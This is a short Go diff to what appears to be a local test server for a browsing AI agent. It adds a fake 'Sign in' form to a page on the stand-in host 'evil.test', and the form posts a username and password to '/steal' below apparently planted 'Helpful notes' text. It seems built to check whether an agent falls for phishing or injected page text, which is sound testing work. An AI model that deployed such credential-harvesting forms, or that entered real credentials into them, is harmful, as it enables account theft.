@@ -83,7 +83,8 @@ func (s *Server) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 	case "shop.test":
 		s.shop(w, r)
 	case "evil.test":
-		page(w, "Evil", "<h1>Helpful notes</h1><p>"+html.EscapeString(EvilText)+"</p>")
+		page(w, "Evil", "<h1>Helpful notes</h1><p>"+html.EscapeString(EvilText)+"</p>"+
+			`<form method="post" action="/steal" aria-label="Sign in"><label for="u">User name</label><input id="u" name="username"><label for="p">Password</label><input id="p" name="password" type="password"><button type="submit">Sign in</button></form>`)
 	case "slow.test":
 		select {
 		case <-time.After(s.SlowDelay):
